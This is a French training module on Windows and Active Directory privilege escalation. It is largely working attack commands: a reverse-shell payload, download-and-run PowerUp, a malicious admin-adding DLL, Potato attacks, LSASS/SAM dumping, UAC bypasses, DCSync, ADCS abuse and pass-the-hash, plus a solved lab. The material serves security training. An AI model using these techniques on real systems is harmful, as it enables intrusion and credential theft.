---
tags:
  - formation
  - security
  - windows
  - hacking
  - privilege-escalation
  - mimikatz
  - potato
---

# Module 4 : Escalade de Privilèges

L'escalade de privilèges est souvent la clé pour passer d'un simple accès utilisateur à une compromission totale. Ce module couvre les techniques d'élévation locale sur Windows et l'escalade vers Domain Admin dans Active Directory.

## Objectifs du Module

À la fin de ce module, vous serez capable de :

- Énumérer efficacement les vecteurs d'escalade avec WinPEAS et PowerUp
- Exploiter les services Windows mal configurés
- Abuser des privilèges de tokens (SeImpersonate, SeAssignPrimaryToken)
- Contourner l'UAC avec plusieurs techniques
- Extraire les credentials locaux (SAM, LSASS, cached credentials)
- Réaliser un DCSync pour compromettre le domaine entier

**Durée estimée :** 6.5 heures
**Niveau :** Intermédiaire à Avancé

---

## 1. Énumération Locale

### 1.1 Informations Système

```powershell
# Informations système
systeminfo
hostname
whoami /all

# Utilisateurs et groupes
net user
net localgroup
net localgroup Administrators

# Processus et services
tasklist /svc
wmic service list brief
sc query

# Variables d'environnement
set
$env:PATH

# Historique PowerShell
Get-Content (Get-PSReadlineOption).HistorySavePath
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### 1.2 WinPEAS - Énumération Automatisée

!!! tip "WinPEAS - L'outil de référence"
    WinPEAS (Windows Privilege Escalation Awesome Scripts) automatise la recherche de vecteurs d'escalade.

```powershell
# Télécharger et exécuter
Invoke-WebRequest -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe" -OutFile winpeas.exe
.\winpeas.exe

# Options spécifiques
.\winpeas.exe quiet                    # Moins de sortie
.\winpeas.exe servicesinfo             # Focus services
.\winpeas.exe applicationsinfo         # Focus applications
.\winpeas.exe log=output.txt           # Sauvegarder dans fichier

# Version sans touches de couleur (pour redirection)
.\winpeas.exe notcolor > output.txt
```

**Sections importantes de WinPEAS :**

| Section | Ce qu'elle révèle |
|---------|-------------------|
| Basic System Info | OS, patches, architecture |
| Users & Groups | Comptes, groupes, privilèges |
| Services | Services vulnérables, permissions |
| Applications | Logiciels installés, versions |
| Network | Connexions, ports, firewall |
| Windows Credentials | Credentials stockés |
| Interesting Files | Fichiers avec credentials potentiels |

### 1.3 PowerUp - Énumération PowerShell

```powershell
# Charger PowerUp
Import-Module .\PowerUp.ps1
# ou
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')

# Énumération complète
Invoke-AllChecks

# Checks spécifiques
Get-ServiceUnquoted              # Unquoted service paths
Get-ModifiableServiceFile        # Binaires modifiables
Get-ModifiableService            # Services reconfigurables
Get-UnattendedInstallFile        # Fichiers unattend.xml
Get-RegistryAutoLogon           # Autologon credentials
Get-CachedGPPPassword           # GPP passwords
```

### 1.4 Seatbelt - Security Auditing

```powershell
# Seatbelt - outil de GhostPack
.\Seatbelt.exe -group=all

# Groupes spécifiques
.\Seatbelt.exe -group=user        # Infos utilisateur
.\Seatbelt.exe -group=system      # Infos système
.\Seatbelt.exe -group=misc        # Divers

# Commandes individuelles
.\Seatbelt.exe TokenPrivileges
.\Seatbelt.exe CredEnum
.\Seatbelt.exe InterestingFiles
```

---

## 2. Exploitation des Services

### 2.1 Unquoted Service Paths

**Concept :** Si un chemin de service contient des espaces et n'est pas entre guillemets, Windows cherche les exécutables dans un ordre spécifique.

```
Chemin : C:\Program Files\My App\Service\binary.exe

Windows cherche :
1. C:\Program.exe
2. C:\Program Files\My.exe
3. C:\Program Files\My App\Service\binary.exe

Si on peut écrire dans C:\Program Files\My.exe -> code execution
```

**Identification :**

```powershell
# Avec WMI
wmic service get name,pathname,startmode | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Avec PowerUp
Get-ServiceUnquoted
```

**Exploitation :**

```powershell
# 1. Identifier un chemin vulnérable
# Exemple : C:\Program Files\Vulnerable App\service.exe

# 2. Vérifier les permissions d'écriture
icacls "C:\Program Files\Vulnerable App"

# 3. Placer un payload
# Générer avec msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f exe -o Vulnerable.exe

# 4. Copier au bon endroit
copy Vulnerable.exe "C:\Program Files\Vulnerable.exe"

# 5. Redémarrer le service (si possible)
sc stop VulnerableService
sc start VulnerableService
# ou attendre un reboot
```

### 2.2 Weak Service Permissions

**Concept :** Si on peut modifier la configuration d'un service (binPath), on peut lui faire exécuter notre code.

```powershell
# Identifier avec accesschk (Sysinternals)
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

# Avec PowerUp
Get-ModifiableService

# Exploitation
sc config VulnerableService binpath= "C:\temp\reverse.exe"
sc stop VulnerableService
sc start VulnerableService

# Ou ajouter un utilisateur admin
sc config VulnerableService binpath= "net localgroup Administrators attacker /add"
sc stop VulnerableService
sc start VulnerableService
```

### 2.3 Weak Service Binary Permissions

**Concept :** Si on peut remplacer le binaire du service directement.

```powershell
# Vérifier les permissions du binaire
icacls "C:\Program Files\Service\binary.exe"

# Si (M) ou (F) pour notre utilisateur -> vulnérable
# M = Modify, F = Full Control

# Exploitation
# Backup de l'original
copy "C:\Program Files\Service\binary.exe" binary.exe.bak

# Remplacer par notre payload
copy reverse.exe "C:\Program Files\Service\binary.exe"

# Redémarrer le service
sc stop ServiceName
sc start ServiceName
```

### 2.4 DLL Hijacking

**Concept :** Un programme charge des DLL dans un ordre précis. Si on peut placer une DLL malveillante dans un chemin prioritaire, elle sera chargée.

```
Ordre de recherche DLL :
1. Répertoire de l'application
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Répertoire courant
6. Répertoires dans PATH
```

**Identification :**

```powershell
# Avec Process Monitor (Sysinternals)
# Filtrer : Result = NAME NOT FOUND, Path ends with .dll

# Liste des DLL manquantes communes :
# - wlbsctrl.dll (IKEEXT service)
# - CRYPTSP.dll
# - VERSION.dll
```

**Création d'une DLL malveillante :**

```c
// dllmain.c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("net localgroup Administrators attacker /add");
    }
    return TRUE;
}
```

```bash
# Compilation avec MinGW
x86_64-w64-mingw32-gcc -shared -o malicious.dll dllmain.c
```

---

## 3. Token Manipulation - Potato Attacks

### 3.1 Comprendre les Privilèges de Token

| Privilège | Description | Exploitable |
|-----------|-------------|:-----------:|
| SeImpersonatePrivilege | Impersonate tokens | :white_check_mark: |
| SeAssignPrimaryTokenPrivilege | Assign tokens | :white_check_mark: |
| SeBackupPrivilege | Bypass file ACLs | :white_check_mark: |
| SeRestorePrivilege | Restore files | :white_check_mark: |
| SeDebugPrivilege | Debug processes | :white_check_mark: |
| SeTakeOwnershipPrivilege | Take ownership | :white_check_mark: |
| SeLoadDriverPrivilege | Load drivers | :white_check_mark: |

```powershell
# Vérifier ses privilèges
whoami /priv

# Si SeImpersonatePrivilege est ENABLED -> Potato attacks possibles
# Comptes concernés : IIS AppPool, MSSQL, service accounts
```

### 3.2 JuicyPotato (Windows Server 2016/2019, Windows 10 < 1809)

```powershell
# Télécharger JuicyPotato
# https://github.com/ohpe/juicy-potato/releases

# Utilisation basique
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}

# Avec reverse shell
.\JuicyPotato.exe -l 1337 -p C:\temp\reverse.exe -t *

# CLSIDs communs (varient selon l'OS)
# Windows Server 2016 : {e60687f7-01a1-40aa-86ac-db1cbf673334}
# Windows 10 1803 : {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

### 3.3 PrintSpoofer (Windows 10 1809+, Server 2019)

```powershell
# Plus universel que JuicyPotato
.\PrintSpoofer64.exe -i -c cmd

# Avec commande spécifique
.\PrintSpoofer64.exe -c "C:\temp\reverse.exe"

# Créer un utilisateur admin
.\PrintSpoofer64.exe -c "net user hacker Password123! /add"
.\PrintSpoofer64.exe -c "net localgroup Administrators hacker /add"
```

### 3.4 GodPotato (Fonctionne sur toutes les versions)

```powershell
# GodPotato - le plus récent et universel
.\GodPotato.exe -cmd "cmd /c whoami"

# Reverse shell
.\GodPotato.exe -cmd "C:\temp\reverse.exe"

# Ajouter un utilisateur
.\GodPotato.exe -cmd "net user attacker P@ssw0rd /add && net localgroup Administrators attacker /add"
```

### 3.5 Token Impersonation avec Incognito

```powershell
# Depuis Meterpreter
meterpreter> load incognito
meterpreter> list_tokens -u

# Résultat :
# YOURCOMPANY\Administrator
# NT AUTHORITY\SYSTEM

# Impersonate
meterpreter> impersonate_token "YOURCOMPANY\Administrator"

# Vérifier
meterpreter> getuid
```

---

## 4. Credential Access

### 4.1 SAM & SYSTEM Dump

La base SAM contient les hashes des comptes locaux.

```powershell
# Méthode 1 : Avec reg.exe (requiert admin)
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save
reg save HKLM\SECURITY security.save

# Transférer sur Kali et extraire
secretsdump.py -sam sam.save -system system.save -security security.save LOCAL

# Méthode 2 : Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system

# Méthode 3 : Avec Mimikatz
privilege::debug
token::elevate
lsadump::sam
```

### 4.2 LSASS Dump

LSASS (Local Security Authority Subsystem Service) stocke les credentials des utilisateurs connectés.

!!! warning "Détection EDR"
    Le dump de LSASS est très surveillé. Les techniques suivantes sont classées par niveau de détection.

**Méthode classique (haute détection) :**

```powershell
# Avec Mimikatz
privilege::debug
sekurlsa::logonpasswords

# Avec ProcDump (Sysinternals)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Analyser le dump sur Kali
pypykatz lsa minidump lsass.dmp
```

**Méthode via comsvcs.dll (détection moyenne) :**

```powershell
# Trouver le PID de lsass
tasklist | findstr lsass

# Dump via rundll32
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [PID] C:\temp\lsass.dmp full
```

**Méthode via Task Manager (détection faible) :**

1. Ouvrir Task Manager en tant qu'admin
2. Onglet "Details"
3. Clic droit sur lsass.exe → "Create dump file"

### 4.3 Cached Credentials

Windows met en cache les credentials pour permettre la connexion hors ligne.

```powershell
# Avec Mimikatz
privilege::debug
lsadump::cache

# Format DCC2 (Domain Cached Credentials 2)
# Cracking avec Hashcat (mode 2100)
hashcat -m 2100 dcc2_hashes.txt wordlist.txt
```

### 4.4 Credential Manager

```powershell
# Lister les credentials stockés
cmdkey /list

# Avec Mimikatz
vault::cred

# Avec PowerShell
[System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR((Get-StoredCredential -Target "target").Password))
```

---

## 5. UAC Bypass

### 5.1 Comprendre l'UAC

User Account Control protège contre les élévations non autorisées. Mais certaines techniques permettent de le contourner.

```powershell
# Vérifier le niveau UAC
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System

# ConsentPromptBehaviorAdmin :
# 0 = Elevate without prompting
# 1 = Prompt for credentials on secure desktop
# 2 = Prompt for consent on secure desktop
# 5 = Prompt for consent for non-Windows binaries (default)
```

### 5.2 Fodhelper Bypass (Windows 10)

```powershell
# Fodhelper.exe auto-elève et lit une clé de registre pour lancer un programme

# Créer la clé
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force

# Déclencher
Start-Process "C:\Windows\System32\fodhelper.exe"

# Nettoyage
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```

### 5.3 Eventvwr Bypass

```powershell
# Eventvwr.exe lit mscfile\shell\open\command

# Créer la clé
New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\shell\open\command" -Name "(default)" -Value "C:\Windows\System32\cmd.exe" -Force

# Déclencher
Start-Process "C:\Windows\System32\eventvwr.exe"

# Nettoyage
Remove-Item "HKCU:\Software\Classes\mscfile\" -Recurse -Force
```

### 5.4 UACME - Framework de Bypass

```powershell
# UACME contient 70+ techniques de bypass UAC
# https://github.com/hfiref0x/UACME

# Utilisation
.\Akagi64.exe [method_number] [command]

# Méthodes populaires :
# 23 - Fodhelper
# 33 - sdclt.exe
# 41 - cmstp.exe
# 61 - wsreset.exe
```

---

## 6. Domain Privilege Escalation

### 6.1 DCSync Attack

**Concept :** Si vous avez les droits "Replicating Directory Changes" (normalement réservés aux DCs), vous pouvez demander au DC de répliquer les hashes de n'importe quel utilisateur.

**Prérequis :** Membre de Domain Admins, Enterprise Admins, ou groupe avec droits DCSync explicites.

```powershell
# Avec Mimikatz
lsadump::dcsync /user:yourcompany\Administrator
lsadump::dcsync /user:yourcompany\krbtgt

# Tous les utilisateurs
lsadump::dcsync /all /csv
```

```bash
# Avec Impacket
secretsdump.py yourcompany.local/admin:'Password123'@dc01.yourcompany.local

# Juste certains comptes
secretsdump.py yourcompany.local/admin:'Password123'@dc01.yourcompany.local -just-dc-user Administrator
secretsdump.py yourcompany.local/admin:'Password123'@dc01.yourcompany.local -just-dc-user krbtgt
```

### 6.2 ADCS Exploitation (ESC1-ESC8)

Active Directory Certificate Services peut être abusé pour l'escalade de privilèges.

**ESC1 - Template avec enrollee supplies subject :**

```bash
# Identifier les templates vulnérables
certipy find -u j.smith@yourcompany.local -p 'Welcome1' -dc-ip 192.168.56.10

# Demander un certificat pour Administrator
certipy req -u j.smith@yourcompany.local -p 'Welcome1' -ca 'CA-NAME' -target dc01.yourcompany.local -template 'VulnerableTemplate' -upn Administrator@yourcompany.local

# Authentification avec le certificat
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.10
```

**ESC4 - Template ACL abuse :**

```bash
# Si on a WriteDacl sur un template
certipy template -u j.smith@yourcompany.local -p 'Welcome1' -template 'VulnerableTemplate' -save-old

# Modifier pour activer ESC1
certipy template -u j.smith@yourcompany.local -p 'Welcome1' -template 'VulnerableTemplate' -configuration 'ESC1'

# Exploiter comme ESC1
```

### 6.3 GPO Abuse

Si vous avez des droits d'écriture sur une GPO appliquée à des machines/utilisateurs sensibles :

```powershell
# Identifier les GPOs modifiables avec PowerView
Get-DomainGPO | Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner"}

# Avec SharpGPOAbuse
.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName "Vulnerable GPO"

# Ou ajouter une scheduled task
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author YOURCOMPANY\Admin --Command "cmd.exe" --Arguments "/c net localgroup Administrators attacker /add" --GPOName "Vulnerable GPO"

# Forcer l'application de la GPO
gpupdate /force
```

---

## Exercice Pratique

!!! example "Exercice : Escalade vers SYSTEM via 4 Techniques"

    **Objectif** : Obtenir un shell SYSTEM depuis un compte utilisateur standard via 4 méthodes différentes

    **Contexte** : Vous avez un shell en tant que `YOURCOMPANY\j.smith` sur une machine Windows 10. Le compte IIS AppPool est également compromis sur le serveur web.

    **Technique 1 : Service Exploitation (45 min)**

    1. Énumérer les services avec WinPEAS/PowerUp
    2. Identifier un service vulnérable (unquoted path ou weak permissions)
    3. Exploiter pour obtenir SYSTEM

    **Technique 2 : Potato Attack (30 min)**

    1. Sur le serveur web, vérifier les privilèges du compte IIS
    2. Si SeImpersonatePrivilege est présent, utiliser PrintSpoofer/GodPotato
    3. Obtenir un shell SYSTEM

    **Technique 3 : Credential Extraction (45 min)**

    1. Dump SAM/SYSTEM ou LSASS
    2. Extraire les hashes
    3. Pass-the-Hash vers une autre machine avec admin local

    **Technique 4 : UAC Bypass + Escalade (30 min)**

    1. Utiliser fodhelper pour bypass UAC
    2. Depuis le shell élevé, extraire les credentials

    **Critères de réussite** :

    - [ ] Shell SYSTEM obtenu via exploitation de service
    - [ ] Shell SYSTEM obtenu via Potato attack
    - [ ] Hash admin local extrait et utilisé pour PtH
    - [ ] UAC bypassé avec succès

??? quote "Solution"

    **Technique 1 : Service Exploitation**

    ```powershell
    # 1. Énumération
    .\winpeas.exe servicesinfo

    # Résultat : Service "VulnService" avec unquoted path
    # C:\Program Files\Vulnerable App\service.exe

    # 2. Vérifier permissions
    icacls "C:\Program Files\Vulnerable App"
    # Résultat : Users:(M)

    # 3. Générer payload (sur Kali)
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.56.100 LPORT=4444 -f exe -o Vulnerable.exe

    # 4. Placer le payload
    copy Vulnerable.exe "C:\Program Files\Vulnerable.exe"

    # 5. Listener (sur Kali)
    nc -lvnp 4444

    # 6. Redémarrer le service (ou attendre reboot)
    sc stop VulnService
    sc start VulnService

    # Shell SYSTEM reçu!
    ```

    **Technique 2 : Potato Attack**

    ```powershell
    # 1. Vérifier les privilèges (sur le serveur web en tant que IIS)
    whoami /priv
    # SeImpersonatePrivilege    Enabled

    # 2. Utiliser PrintSpoofer
    .\PrintSpoofer64.exe -i -c "cmd"

    # Résultat :
    # C:\WINDOWS\system32>whoami
    # nt authority\system
    ```

    **Technique 3 : Credential Extraction**

    ```powershell
    # 1. Dump SAM (requiert admin local obtenu précédemment)
    reg save HKLM\SAM C:\temp\sam
    reg save HKLM\SYSTEM C:\temp\system

    # 2. Transférer et extraire (sur Kali)
    secretsdump.py -sam sam -system system LOCAL

    # Résultat :
    # Administrator:500:aad3...:31d6cfe0d16ae931b73c59d7e0c089c0:::

    # 3. Pass-the-Hash vers une autre machine
    crackmapexec smb 192.168.56.50 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0

    # [+] Pwn3d!
    psexec.py Administrator@192.168.56.50 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
    ```

    **Technique 4 : UAC Bypass**

    ```powershell
    # 1. Vérifier qu'on est admin mais non élevé
    whoami /groups | findstr "Medium"
    # Mandatory Label\Medium Mandatory Level

    # 2. Fodhelper bypass
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe" -Force
    Start-Process "C:\Windows\System32\fodhelper.exe"

    # 3. Dans le nouveau cmd élevé
    whoami /groups | findstr "High"
    # Mandatory Label\High Mandatory Level

    # 4. Depuis ce shell élevé, dump des credentials
    .\mimikatz.exe
    privilege::debug
    sekurlsa::logonpasswords
    ```

---

## Points Clés à Retenir

- **Énumérer avant d'exploiter** : WinPEAS/PowerUp révèlent les vecteurs
- **Services Windows** : Très souvent mal configurés
- **SeImpersonatePrivilege** : = Shell SYSTEM avec Potato attacks
- **LSASS** : Cible prioritaire mais très surveillée
- **UAC** : N'est pas une barrière de sécurité fiable
- **DCSync** : Fin de partie si obtenu

---

## Ressources

- [HackTricks - Windows Local Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation)
- [PayloadsAllTheThings - Windows PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [LOLBAS Project](https://lolbas-project.github.io/)
- [GhostPack Tools](https://github.com/GhostPack)

---

| | |
|:---|---:|
| [← Module 3 : AD Compromise](03-module.md) | [Module 5 : Post-Exploitation →](05-module.md) |

[Retour au Programme](index.md){ .md-button }
